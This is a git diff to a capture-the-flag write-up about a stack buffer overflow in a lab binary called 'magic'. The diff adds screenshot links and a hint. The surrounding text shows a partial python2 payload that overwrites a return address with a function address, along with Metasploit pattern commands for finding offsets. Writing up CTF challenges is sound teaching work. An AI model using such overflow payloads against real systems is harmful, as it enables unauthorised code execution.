@@ -74,6 +74,8 @@ undefined8 FUN_0040129b(int param_1,long param_2)
 
 A beautified version is :
 
+![beautified](https://github.com/partywavesec/partywavesec.github.io/blob/main/ctf/images/magic_stack_main.png)
+
 The main function accept as first arg a file path that is opened by ```fopen()``` function. An array of 10 char (renamed 'file_content') read 10 bytes from the FILE stream 
 and checks if the first char is lower than '\n' char.
 
@@ -138,7 +140,7 @@ It's enough to create a long strings with the function address or you can calcul
 
 ```bash
 # no offset
-# complete the exploit by yourself now
+# complete the exploit by yourself now - use \xff
 python2 -c 'print [NOW_COMPLETE_PAYLOAD] + "6\x12@\x00\x00\x00\x00\x00" * 100' > runme
 
 /usr/bin/magic <PAYLOAD_FILE>
@@ -147,3 +149,5 @@ python2 -c 'print [NOW_COMPLETE_PAYLOAD] + "6\x12@\x00\x00\x00\x00\x00" * 100' >
 msf-pattern_create -l 150
 msf-pattern_offset -q <VALUE>
 ```
+
+![flag](https://github.com/partywavesec/partywavesec.github.io/blob/main/ctf/images/magic_stack_flag.png)
